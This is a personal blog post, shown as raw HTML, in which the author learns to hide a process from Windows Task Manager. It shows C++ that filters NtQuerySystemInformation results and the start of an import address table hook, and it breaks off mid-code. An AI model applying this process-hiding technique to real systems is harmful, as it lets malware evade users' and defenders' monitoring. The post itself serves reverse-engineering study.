<!DOCTYPE html><html class="dark" lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/_next/static/media/1imports.4c27a8e1.png"/><link rel="stylesheet" href="/_next/static/css/b7f3fc1ab3fdfa35.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-5a3a6c3e710ac7fe.js"/><script src="/_next/static/chunks/79b3e8d8-f83e3fa52851d2bb.js" async=""></script><script src="/_next/static/chunks/919-088e9c819cd621c1.js" async=""></script><script src="/_next/static/chunks/main-app-ac171a45b3f45607.js" async=""></script><script src="/_next/static/chunks/968-86d16f6179c32d37.js" async=""></script><script src="/_next/static/chunks/app/posts/hiding-in-task-mgr/page-644b9af44d50b4ce.js" async=""></script><script src="/_next/static/chunks/508-d5c020c7dab9579d.js" async=""></script><script src="/_next/static/chunks/app/posts/layout-8c5640ecdae9f2fd.js" async=""></script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="font-body bg-white dark:bg-black text-black dark:text-zinc-300"><div class="flex flex-col h-screen"><nav><div class="flex justify-center xs:justify-end pl-4 pr-4 pt-2"><a class="rounded-md px-3 py-2 text-sm font-medium text-gray-300 hover:bg-gray-700 hover:text-white" href="/">Home</a><a href="#" class="rounded-md px-3 py-2 text-sm font-medium text-gray-300 hover:bg-gray-700 hover:text-white">About</a><a href="#" class="rounded-md px-3 py-2 text-sm font-medium text-gray-300 hover:bg-gray-700 hover:text-white">Contact</a></div></nav><main class="flex-grow"><div class="mx-auto px-12 gap-10 place-content-center w-6xl"><div class="mt-6 text-xl leading-10"><h1 class="text-4xl mb-1">WinAPI Hooking: Hiding Process in Task Manager</h1><h3 class="text-gray-400 mb-4">Fri, June 19, 2020</h3><p>I was using Google Chrome for web development purposes and it suddenly stop responding. As usual, I opened my task manager to close that process. While I was searching for chrome.exe, these questions popped into my mind: How does a malware hide itself from the Task Manager? Is this how game hacks evade from anti-cheat software? &quot;I asked these questions probably because I just started reading Practical Malware Analysis! My mind was still in the context of Malware. My guess was that a Window API function is responsible for listing all processes in a system. That way, the function can be used in different applications such as the Task Manager. I open Task Manager on Ghidra to see its imports table. </p><div class="flex justify-center"><img src="/_next/static/media/1imports.4c27a8e1.png" alt="Imports table shown in Ghidra"/></div><br/><p>Of course, I am not familiar with most of the DLL listed above. I&#x27;m only familiar with user32 and kernel32 DLLs. I was pretty sure it&#x27;s not in User32 because that DLL only handles Windows-GUI related functions. One by one, I expanded the DLLs to check what functions does it export. On ntdll.dll, two functions caught my sight; NtQueryInformationProcess and NtQuerySystemInformation. NtQueryInformationProcess retrieves information for only a single process while NtQuerySystemInformation retrieves different kind of data (this includes all running processes on the system) based on its first parameter SYSTEM_INFORMATION_CLASS. To retrieve the list of running processes, you need to pass SystemProcessInformation (which is just equal to 5) as the first parameter. To confirm if Task Manager is using this function to get the processes, I checked the cross references to the function. Below is the second cross reference given by Ghidra.  Yes! It does use NtQuerySystemInformation and pass 5 as its first parameter! For now, I am still unsure which part of the program use the code snippet from above because I am still new to reverse engineering. What now???!  Playing with Windows API For this blog post, my goal was to hide notepad.exe from Task Manager. You can know more about NtQuerySystemInformation by clicking here [https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation]</p><br/><p>The important thing is that the second argument is a pointer to a buffer, which will be overwritten by the function with linked-list-like system information. The type of system information will be determined by the first argument. In this case, the system information is going to be the process information. Below is a sample of that data (SystemBasicInformation).  I described it as a linked-list-like data because the NextEntryOffset property is the address relative to the next process information object. I created a loop that will use the NextEntryOffset to iterate to all process information until the NextEntryOffset is equal to zero. The ImageName property is a buffer to the name of the process. Below is a code that will print all process names.</p><pre style="color:white;background:hsl(0, 0%, 8%);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;border-radius:.5em;border:.3em solid hsl(0, 0%, 33%);box-shadow:1px 1px .5em black inset;margin:.5em 0;overflow:auto;padding:1em"><code class="language-cpp" style="white-space:pre;color:white;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">1</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">while</span><span> </span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">2</span><span>      </span><span class="token" style="color:hsl(53, 89%, 79%)">if</span><span> </span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>ImageName</span><span class="token" style="-opacity:.7">.</span><span class="token type-opencl-host-cpp" style="color:hsl(53, 89%, 79%)">Buffer</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">!=</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">3</span><span>        </span><span class="token function">printf</span><span class="token" style="-opacity:.7">(</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;%ws\n&quot;</span><span class="token" style="-opacity:.7">,</span><span> systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>ImageName</span><span class="token" style="-opacity:.7">.</span><span class="token type-opencl-host-cpp" style="color:hsl(53, 89%, 79%)">Buffer</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">4</span><span>      </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">5</span><span>      systemInformation </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">6</span><span>          </span><span class="token" style="-opacity:.7">(</span><span>PSYSTEM_PROCESS_INFORMATION</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">7</span><span>                                        </span><span class="token" style="-opacity:.7">(</span><span>LPBYTE</span><span class="token" style="-opacity:.7">)</span><span>systemInformation</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">8</span><span>    </span><span class="token" style="-opacity:.7">}</span></code></pre><div class="text-center text-md text-gray-500 mt-2 mb-2">Listing 1. Iterating to all process information</div><p>Some little modification, instead of printing the process name for each iteration, you can just use if-statement to compare whether the process name is notepad.exe. If it is, remove the object from the linked list. Else, do nothing. You can check  linked-lists here [https://www.bitdegree.org/learn/linked-list-c-plus-plus].  That means, I need to get the next process name too. If the next process name is equal to notepad.exe, I will overwrite the current process object\&#x27;s NextEntryOffset with the NEXT process object\&#x27;s NextEntryOffset plus the CURRENT  process object\&#x27;s NextEntryOffset. Confusing, ain\&#x27;t it?</p><pre style="color:white;background:hsl(0, 0%, 8%);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;border-radius:.5em;border:.3em solid hsl(0, 0%, 33%);box-shadow:1px 1px .5em black inset;margin:.5em 0;overflow:auto;padding:1em"><code class="language-cpp" style="white-space:pre;color:white;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">1</span><span>  status </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">NtQuerySystemInformation</span><span class="token" style="-opacity:.7">(</span><span>SystemProcessInformation</span><span class="token" style="-opacity:.7">,</span><span> systemInformation</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">2</span><span>                                    bufferSize</span><span class="token" style="-opacity:.7">,</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">3</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">if</span><span> </span><span class="token" style="-opacity:.7">(</span><span class="token function">NT_SUCCESS</span><span class="token" style="-opacity:.7">(</span><span>status</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">4</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">while</span><span> </span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">5</span><span>      PSYSTEM_PROCESS_INFORMATION nextProcessInformation </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">6</span><span>          </span><span class="token function">PSYSTEM_PROCESS_INFORMATION</span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">7</span><span>                                      </span><span class="token" style="-opacity:.7">(</span><span>LPBYTE</span><span class="token" style="-opacity:.7">)</span><span>systemInformation</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">8</span><span>      </span><span class="token" style="color:hsl(53, 89%, 79%)">if</span><span> </span><span class="token" style="-opacity:.7">(</span><span class="token function">wcscmp</span><span class="token" style="-opacity:.7">(</span><span>nextProcessInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>ImageName</span><span class="token" style="-opacity:.7">.</span><span class="token type-opencl-host-cpp" style="color:hsl(53, 89%, 79%)">Buffer</span><span class="token" style="-opacity:.7">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">9</span><span>                 L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;PracticeNTQSI.exe&quot;</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">==</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">0</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">10</span><span>        offsetToHideProcess </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">11</span><span>            offsetToHideProcess </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span> systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">12</span><span>        systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">13</span><span>            nextProcessInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">14</span><span>            systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">15</span><span>      </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">16</span><span>      systemInformation </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">17</span><span>          </span><span class="token" style="-opacity:.7">(</span><span>PSYSTEM_PROCESS_INFORMATION</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span>systemInformation</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>NextEntryOffset </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">18</span><span>                                        </span><span class="token" style="-opacity:.7">(</span><span>LPBYTE</span><span class="token" style="-opacity:.7">)</span><span>systemInformation</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">19</span><span>    </span><span class="token" style="-opacity:.7">}</span></code></pre><div class="text-center text-md text-gray-500 mt-2 mb-2">Listing 2. Removing chosen process name from NTSQI result</div><p>Hooking it! I now have a function (or a concept) that removes my chosen process from the list of process given by NTQSI. I just need to know how to force Task Manager to call a rogue function instead of the real one, but I am getting ahead of myself. Task Manager is a remote process. I don\&#x27;t even know how to do it on the current process! I should do that first.  I just know the term Windows API hooking but NO idea how to do it, just guesses. After a quick google search, I learned about import address table (IAT) hooking.  This stackoverflow post [https://stackoverflow.com/questions/7673754/pe-format-iat-questions] help me to understand how to get virtual addresses of Windows APIs. Basically, all Windows API functions that are imported are stored in a table allocated in a virtual address. If a process needs to call a Windows API, it can just perform a lookup on that table and get the appropriate address. If you can overwrite that address with the address of a rogue function, then function call is redirected to the rogue function instead of the legitimate one.  Currently, using listing 2 as my rogue function will not work just yet. It still needs modification because line 1 will just call itself resulting to recursion. Remember, I will change the address in the IAT, therefore, before hooking, I should store the address of the legitimate function first. To call the legitimate function, that address will be used. Below is the code that will do that concept.</p><br/><pre style="color:white;background:hsl(0, 0%, 8%);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;border-radius:.5em;border:.3em solid hsl(0, 0%, 33%);box-shadow:1px 1px .5em black inset;margin:.5em 0;overflow:auto;padding:1em"><code class="language-cpp" style="white-space:pre;color:white;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;text-shadow:0 -.1em .2em black;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">1</span><span class="token" style="color:hsl(53, 89%, 79%)">void</span><span> </span><span class="token function">Patch</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">2</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">const</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">char</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">*</span><span>dllName </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;dll.dll&quot;</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">3</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">const</span><span> </span><span class="token" style="color:hsl(53, 89%, 79%)">char</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">*</span><span>funcName </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;NtQuerySystemInformation&quot;</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">4</span><span>  </span><span class="token" style="color:hsl(0, 0%, 47%)">// https://stackoverflow.com/questions/7673754/pe-format-iat-questions</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">5</span><span>  HMODULE hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token function">GetModuleHandle</span><span class="token" style="-opacity:.7">(</span><span class="token" style="color:hsl(53, 89%, 79%)">NULL</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">6</span><span>  PIMAGE_DOS_HEADER dosHeader </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_DOS_HEADER</span><span class="token" style="-opacity:.7">)</span><span>hModule</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">7</span><span>  PIMAGE_NT_HEADERS64 ntHeader </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">8</span><span>      </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_NT_HEADERS64</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span> dosHeader</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>e_lfanew</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">9</span><span>  IMAGE_OPTIONAL_HEADER64 optionalHeader </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span> ntHeader</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>OptionalHeader</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">10</span><span>  IMAGE_DATA_DIRECTORY imageDataDirectory </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">11</span><span>      optionalHeader</span><span class="token" style="-opacity:.7">.</span><span>DataDirectory</span><span class="token" style="-opacity:.7">[</span><span>IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="token" style="-opacity:.7">]</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">12</span><span>  PIMAGE_IMPORT_DESCRIPTOR imageImportDescriptor </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">13</span><span>      </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_IMPORT_DESCRIPTOR</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">14</span><span>                                 imageDataDirectory</span><span class="token" style="-opacity:.7">.</span><span>VirtualAddress</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">15</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">16</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">while</span><span> </span><span class="token" style="-opacity:.7">(</span><span>imageImportDescriptor</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>FirstThunk</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">17</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">18</span><span>    PIMAGE_IMPORT_BY_NAME dllIBN </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">19</span><span>        </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_IMPORT_BY_NAME</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span> imageImportDescriptor</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>Name</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">20</span><span>    std</span><span class="token double-colon" style="-opacity:.7">::</span><span>cout </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> dllIBN</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>Name </span><span class="token" style="color:hsl(76, 21%, 52%)">&lt;&lt;</span><span> std</span><span class="token double-colon" style="-opacity:.7">::</span><span>endl</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">21</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">if</span><span> </span><span class="token" style="-opacity:.7">(</span><span>std</span><span class="token double-colon" style="-opacity:.7">::</span><span class="token function">string</span><span class="token" style="-opacity:.7">(</span><span>dllName</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">.</span><span class="token function">compare</span><span class="token" style="-opacity:.7">(</span><span>dllIBN</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>Name</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="color:hsl(76, 21%, 52%)">==</span><span> </span><span class="token" style="color:hsl(14, 58%, 55%)">0</span><span class="token" style="-opacity:.7">)</span><span> </span><span class="token" style="-opacity:.7">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">22</span><span>      PIMAGE_THUNK_DATA64 originalFirstThunk </span><span class="token" style="color:hsl(76, 21%, 52%)">=</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">23</span><span>          </span><span class="token" style="-opacity:.7">(</span><span>PIMAGE_THUNK_DATA64</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">(</span><span class="token" style="-opacity:.7">(</span><span>DWORD64</span><span class="token" style="-opacity:.7">)</span><span>hModule </span><span class="token" style="color:hsl(76, 21%, 52%)">+</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">24</span><span>                                imageImportDescriptor</span><span class="token" style="color:hsl(76, 21%, 52%)">-&gt;</span><span>OriginalFirstThunk</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
